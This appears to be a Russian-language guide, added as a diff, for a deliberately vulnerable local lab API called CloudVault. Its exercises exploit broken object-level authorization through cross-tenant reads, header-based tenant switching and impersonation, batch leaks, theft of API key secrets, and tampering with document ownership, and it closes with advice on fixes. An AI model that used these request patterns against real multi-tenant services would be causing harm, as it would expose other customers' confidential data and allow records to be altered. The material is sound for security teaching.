@@ -1,0 +1,342 @@
+BOLA 3 — CloudVault
+======================================================================
+
+Что это такое
+----------------------------------------------------------------------
+
+Та же ошибка BOLA / IDOR, что в лабах 1 и 2, но в модели SaaS:
+
+  несколько компаний (tenant) на одном API
+  документы с UUID, а не 101, 102, 103
+  право можно обойти заголовком, share-ссылкой, batch-запросом
+
+Чем это сложнее PayFlow (BOLA 2):
+
+  BOLA 2                         BOLA 3
+  числовые id                    UUID документов
+  один «мир» пользователей       orgId: Acme vs Rival (разные клиенты SaaS)
+  query override                 заголовки X-Organization-Id, X-Impersonate-User
+  POST search                    POST query + batch-fetch
+  list vs item                   то же + cross-tenant
+  —                              public share без Bearer
+
+
+Что такое tenant
+----------------------------------------------------------------------
+
+CloudVault — хранилище документов для компаний-клиентов.
+Acme Corp (orgId=1) и Rival Inc (orgId=2) — разные клиенты одной платформы.
+
+Sarah из Acme не должна видеть файлы Rival. Это изоляция tenant.
+Если sarah читает прайс Rival — это уже не «подглядел коллегу»,
+а утечка между компаниями (compliance, GDPR, конкуренты).
+
+
+Что вы делаете в лабе
+----------------------------------------------------------------------
+
+Сайт:      http://localhost:3847/bola3
+API:       http://localhost:3847/bola3/api/v1
+Swagger:   http://localhost:3847/bola3/docs
+
+Пароль страницы и API: portfolio-demo-only
+
+Работать как sarah (Acme, member), если не сказано иначе.
+
+Часть эндпоинтов (share) работает вообще без Bearer — см. задание 5.
+
+
+Как начать
+----------------------------------------------------------------------
+
+1. Откройте http://localhost:3847/bola3 (пароль: portfolio-demo-only).
+2. Swagger: http://localhost:3847/bola3/docs
+3. POST /auth/login:
+
+     {
+       "username": "sarah",
+       "password": "portfolio-demo-only"
+     }
+
+4. accessToken → Authorize → Bearer <token>.
+5. Идите по заданиям: найти эндпоинт в Swagger → вызвать → записать результат.
+
+curl:
+
+  curl -s -X POST http://localhost:3847/bola3/api/v1/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"username":"sarah","password":"portfolio-demo-only"}'
+
+
+Пользователи
+----------------------------------------------------------------------
+
+  username     роль         id   orgId   tenant
+  sarah        member       1    1       Acme Corp     ← вы
+  mike         member       2    1       Acme Corp     ← коллега, чужие файлы
+  rival        member       3    2       Rival Inc     ← другой клиент SaaS
+  contractor   contractor   4    —       внешний
+  admin        admin        5    1       Acme Corp
+
+Документы (uuid укороченно …101 и т.д.):
+
+  d7a1b2c3-0001-4ac0-8001-000000000101   sarah   Acme    Q3 Roadmap
+  d7a1b2c3-0002-4ac0-8001-000000000102   mike    Acme    HR Review + флаг
+  d7a1b2c3-0003-4ac0-8001-000000000103   sarah   Acme    M&A Draft
+  d7a1b2c3-0004-4ac0-8001-000000000201   rival   Rival   pricing + флаг
+
+Workspaces: 801 Acme Engineering, 802 Rival Sales.
+Share без логина: preview-acme-mna-7k2
+API keys: 901 Mike, 902 Rival.
+Audit event с флагом: 502.
+
+Флаги:
+
+  FLAG{BOLA_CLOUDVAULT_DOC_LEAK}        — body документа Mike …102
+  FLAG{BOLA_CLOUDVAULT_CROSS_TENANT}    — body документа Rival …201
+  FLAG{BOLA_CLOUDVAULT_AUDIT_EVENT}     — detail события 502
+  FLAG{BOLA_CLOUDVAULT_API_KEY}         — secret ключа 901
+
+
+Задание 1. Кто я в системе
+----------------------------------------------------------------------
+
+  POST /auth/login   {"username":"sarah","password":"portfolio-demo-only"}
+  GET  /me
+
+Ожидание: id=1, orgId=1, username=sarah, role=member.
+Tenant = Acme Corp. orgId — это компания, не путать с id пользователя.
+
+
+Задание 2. Сколько «моих» документов
+----------------------------------------------------------------------
+
+  GET /me/documents
+
+Ожидание: count=2 (…101 Q3 Roadmap и …103 M&A Draft), ownerId=1.
+
+Mike в той же org (id=2, orgId=1), его документ …102 в этот список
+не попадает: фильтр по ownerId, не по организации.
+Чужой файл коллеги — отдельный BOLA по uuid (задание 4).
+
+
+Задание 3. Чужой tenant
+----------------------------------------------------------------------
+
+  GET /organizations/2/documents
+
+Ожидание: count=1, classification=secret, в body
+  FLAG{BOLA_CLOUDVAULT_CROSS_TENANT}
+
+Не путать с /organizations/1/documents — это Acme (3 документа).
+Нужен именно orgId=2 (Rival).
+
+Это опаснее файла Mike в Acme: ломается изоляция между клиентами SaaS.
+
+
+Задание 4. Конфиденциальный документ Mike
+----------------------------------------------------------------------
+
+Разведка uuid (его не было в /me/documents):
+
+  GET /organizations/1/documents
+  → документ ownerId=2, title «HR Review — confidential»
+
+Чтение:
+
+  GET /documents/d7a1b2c3-0002-4ac0-8001-000000000102
+
+Ожидание: classification=confidential,
+флаг FLAG{BOLA_CLOUDVAULT_DOC_LEAK} в body.
+
+Другие способы узнать uuid:
+  POST /documents/query  {"orgId":1,"ownerId":2}
+  GET  /users/2/vault-export
+
+UUID «не угадывается с 1, 2, 3», поэтому лаба учит разведке:
+списки org, query, export, share.
+
+
+Задание 5. Публичная share-ссылка
+----------------------------------------------------------------------
+
+Без Authorization (в Swagger сначала Logout у Authorize):
+
+  GET /shares/preview-acme-mna-7k2
+
+curl без токена:
+
+  curl -s http://localhost:3847/bola3/api/v1/shares/preview-acme-mna-7k2
+
+Ожидание: docUuid=…103, title M&A Draft, classification=restricted,
+preview (обрезанный текст), hint про GET /documents/{uuid}.
+
+Зачем это атакующему: uuid больше не секрет. Share могли засветить
+в письме, логах, Referer. Дальше — IDOR уже со своим Bearer.
+
+
+Задание 6. Полный restricted M&A по uuid
+----------------------------------------------------------------------
+
+  GET /documents/d7a1b2c3-0003-4ac0-8001-000000000103
+
+Share давал только preview. Этот запрос — полный body.
+
+Почему это BOLA, хотя документ «вашей» org: API не проверяет политику
+restricted / share-only. Любой, кто знает uuid и имеет любой аккаунт,
+читает объект. Тем же путём открываются чужие uuid (Mike, Rival).
+
+
+Задание 7. Подмена tenant заголовком
+----------------------------------------------------------------------
+
+  GET /me/summary
+  Authorization: Bearer <token sarah>
+  X-Organization-Id: 2
+
+Ожидание: orgName=Rival Inc, documentCount=1,
+note про BOLA и X-Organization-Id.
+
+Заголовок переключает контекст org без проверки membership.
+«Me» в имени эндпоинта не значит, что контекст нельзя подменить.
+
+
+Задание 8. POST-фильтр по classification
+----------------------------------------------------------------------
+
+  POST /documents/query
+  {
+    "orgId": 1,
+    "classification": "confidential"
+  }
+
+Ожидание: count=1, uuid …102, title HR Review — тот же документ Mike.
+Тело POST — не право. Фильтры без проверки tenant/owner = массовая утечка.
+
+
+Задание 9. Batch-fetch
+----------------------------------------------------------------------
+
+  POST /documents/batch-fetch
+  {
+    "uuids": [
+      "d7a1b2c3-0002-4ac0-8001-000000000102",
+      "d7a1b2c3-0004-4ac0-8001-000000000201"
+    ]
+  }
+
+Ожидание: requested=2, found=2.
+Первый uuid — Mike (та же Acme), второй — Rival (cross-tenant).
+Массовая выгрузка без проверки каждого объекта.
+
+
+Задание 10. Roster чужого workspace
+----------------------------------------------------------------------
+
+  GET /workspaces/802/roster
+
+Ожидание: workspaceId=802, orgId=2, в members пользователь rival.
+
+Sarah не состоит в Rival Sales. Roster чужого tenant ей не должен быть виден.
+802 — id workspace Rival (801 — Acme).
+
+
+Задание 11. Vault export конкурента
+----------------------------------------------------------------------
+
+  GET /users/3/vault-export
+
+Ожидание:
+  1 документ (pricing Rival + флаг CROSS_TENANT)
+  1 API key (902, Rival sync)
+  1 workspace (802)
+
+Полный слепок пользователя другого клиента платформы.
+
+
+Задание 12. Audit: список закрыт, событие открыто
+----------------------------------------------------------------------
+
+  GET /audit/events       → 403 (sarah = member)
+  GET /audit/events/502   → 200, в detail
+                            FLAG{BOLA_CLOUDVAULT_AUDIT_EVENT}
+
+Как в PayFlow: закрыли коллекцию по роли, item IDOR оставили.
+В 403 обычно есть намёк попробовать /audit/events/{id}.
+
+
+Задание 13. Secret чужого API key
+----------------------------------------------------------------------
+
+  GET /api-keys/901
+
+Ожидание: ownerId=2 (Mike), name «Mike CI pipeline»,
+secret содержит FLAG{BOLA_CLOUDVAULT_API_KEY}.
+
+id 901 можно взять из GET /users/2/vault-export.
+Чужой live-секрет CI — типичный BOLA на ключах.
+
+
+Задание 14. PUT — изменить чужой документ
+----------------------------------------------------------------------
+
+  PUT /documents/d7a1b2c3-0002-4ac0-8001-000000000102
+  {
+    "title": "Pwned by sarah"
+  }
+
+Ожидание: 200. GET того же uuid показывает новый title.
+Write BOLA: порча HR-документа коллеги.
+
+При необходимости сбросьте данные на /bola3.
+
+
+Задание 15. Transfer — забрать владение
+----------------------------------------------------------------------
+
+  POST /documents/d7a1b2c3-0002-4ac0-8001-000000000102/transfer
+  {
+    "newOwnerId": 1
+  }
+
+Ожидание: ownerId стал 1. Документ Mike появляется в GET /me/documents
+(было 2 «своих», станет 3, если не сбрасывали после задания 14).
+
+Смена владельца без проверки — write BOLA на самый опасный сценарий:
+объект юридически становится «вашим».
+
+После демо нажмите «Сбросить данные» на /bola3.
+
+
+Бонус. Impersonation через заголовок
+----------------------------------------------------------------------
+
+  GET /support/session
+  X-Impersonate-User: 2
+
+Ожидание: actingAs = mike (id=2), в documents — его HR Review.
+
+Заголовок «я поддержка» не проверяет роль support/admin.
+Любой sarah может работать «от имени» Mike.
+
+
+Как чинить
+----------------------------------------------------------------------
+
+На каждый объект:
+
+  документ.ownerId === текущий user
+  ИЛИ явный share / membership в workspace
+  И orgId объекта === orgId пользователя (изоляция tenant)
+
+Заголовки X-Organization-Id и X-Impersonate-User — только после
+проверки роли. Public share не должен отдавать полный uuid, если
+по нему открывается полный документ. Batch и query проверяют
+каждый элемент, не только «нашли в базе».
+
+UUID сам по себе не защита. Секретность идентификатора — не авторизация.
+
+
+Предыдущие лабы:
+  BOLA 1 — MediNotes   http://localhost:3847/bola
+  BOLA 2 — PayFlow     http://localhost:3847/bola2
